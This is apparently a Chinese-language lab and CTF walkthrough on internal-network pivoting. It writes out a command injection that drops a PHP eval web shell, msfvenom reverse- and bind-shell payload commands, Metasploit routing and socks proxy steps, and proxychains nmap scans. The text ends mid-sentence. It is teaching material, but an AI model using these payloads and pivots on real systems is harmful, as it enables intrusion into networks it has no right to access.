# 案列一（Frp内网渗透）

大概图列![](https://image.3001.net/images/20210908/1631068800_613822808b07aaa8136f4.png!small)网上随便找的，路线是这个样子

这里选用ctfshow的一道命令执行题

由Frp实现内网访问及扫描

## 1.传入一句话，上线蚁剑

    
    
    http://b85fdf24-b98e-4810-9e76-a038a8987630.challenge.ctf.show:8080/?c=`echo '<?php eval(\$_POST[1]);?>' > 1.php`;

## 2.进行frp转发

先服务器启动

    
    
    ./frps -c frps.ini

然后再kali启动

    
    
    ./frpc -c frpc.ini 

## 3.制作linux马上线msf

    
    
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=公网ip LPORT=6000 -f  elf > shell.elf 

直接拖进去并更改权限

![](https://image.3001.net/images/20210908/1631068802_61382282136b06eedf62c.png!small)

kali开启监听

![](https://image.3001.net/images/20210908/1631068803_613822834d772bbc119a2.png!small)

运行shell![](https://image.3001.net/images/20210908/1631068804_61382284a2e6d63f3f68d.png!small)

上线成功![](https://image.3001.net/images/20210908/1631068805_613822854dadd34250114.png!small)

## 4.添加路由

    
    
    run post/multi/manage/autoroute

## 5.socks代理转发

我们现在可以看见其内网但无法进行扫描和访问

![](https://image.3001.net/images/20210908/1631068806_613822867d5adde345d83.png!small)

    
    
    use auxiliary/server/socks_proxy

![](https://image.3001.net/images/20210908/1631068808_613822887cf7a7cc0f172.png!small)

执行即可

## 6.浏览器访问内网

![](https://image.3001.net/images/20210908/1631068810_6138228a369130e2c2ed8.png!small)

![](https://image.3001.net/images/20210908/1631068811_6138228bd2d91785418d0.png!small)

## 7.nmap扫描内网

进入etc目录，按一下f键进行搜索prox

![](https://image.3001.net/images/20210908/1631068813_6138228d34963b41d2a14.png!small)

使用root权限进去修改此文件

![](https://image.3001.net/images/20210908/1631068815_6138228f39626c5aaa0d9.png!small)

和上面的代理转发相对应

使用nmap

注意：这里必须使用-sT和-Pn扫描，不能对内网进行ping访问而，-sT则是TCP连接扫描

    
    
    proxychains4 nmap -sT -Pn 172.12.132.230 

![](https://image.3001.net/images/20210908/1631068816_613822900476753e50743.png!small)

![](https://image.3001.net/images/20210908/1631068817_61382291825688a2f3b7f.png!small)

# 案列二（CFS三层内网漫游）

![](https://image.3001.net/images/20210908/1631068818_61382292d3a0c2b39a05d.jpg!small)

这里没有web端，但大概思路是一样的

主机分别为win sever2008、windows7、win sever 2012，ip地址和上面1、2、3对应

## 1.msf生成木马上线msf（Targer 1）

    
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.76.1 LPORT=2333 -f  exe > 2333.exe

## 2.信息收集

    
    
    ipconfig
    
    route

![](https://image.3001.net/images/20210908/1631068820_6138229427ed8bf400cd6.png!small)

可以看见我们连接的是76的地址，另一条22应该就是连着下一台内网

## 3.添加路由

    
    
    run post/multi/manage/autoroute //自动添加路由
    route print 

![](https://image.3001.net/images/20210908/1631068821_61382295b3c8a457d216b.png!small)

## 4.开代理（socks）

    
    
    use auxiliary/server/socks_proxy 

设置版本为4a

![](https://image.3001.net/images/20210908/1631068822_61382296d7ed23d4e7e1c.png!small)

这里的ip和端口和下面的代理对应（prox）

## 5.nmap扫一下第二台主机

我这里没有web端，如果是题基本就有，配置一下浏览器即可

![此图片的alt属性为空；文件名为image-168-1024x511.png](https://image.3001.net/images/20210908/1631068810_6138228a369130e2c2ed8.png!small)

这里和上面一样

进入etc目录，按一下f键进行搜索prox

![](https://image.3001.net/images/20210908/1631068813_6138228d34963b41d2a14.png!small)

使用root权限进去修改此文件

![](https://image.3001.net/images/20210908/1631068815_6138228f39626c5aaa0d9.png!small)

    
    
    proxychains4 nmap -Pn -sT -v 192.168.22.128

![](https://image.3001.net/images/20210908/1631068827_6138229b78f3ecbad58a3.png!small)

## 重点来了（我们以第一个为跳板渗透第二个，因为第二个没有76网段无法收到信息，那如何以第二个为跳板渗透第三个呢）

## 6.生成正向后门

反向连接木马是攻击机开放端口，靶机连过来；  
正向连接木马是靶机开放端口，攻击机连过去；

    
    
    msfvenom -p windows/meterpreter/bind_tcp  lport=2333 -f exe > bind_2333.exe

## 7.上线msf

    
    
    set payload windows/meterpreter/bind_tcp
    set rhost 192.168.22.127
    set lport 2333

![](https://image.3001.net/images/20210908/1631068828_6138229cdc5272cd73abe.png!small)

注意ip是目标机器的ip，我们攻击的是第二个主机所以就是第二个的ip

后面的操作和前面差不多了

## 总结

web端exp打入第一个服务器，上线msf，添加路由，代理等扫描第二个服务器的web网站，浏览器开启代理访问第二个服务器的网站，打入exp，通过正向连接上线msf（因为msf虽然为76网段，但可以通过代理以22网段访问第二个服务器，而第二个服务器则不可以访问76网段），继续添加33网段的路由，如果有web端则再

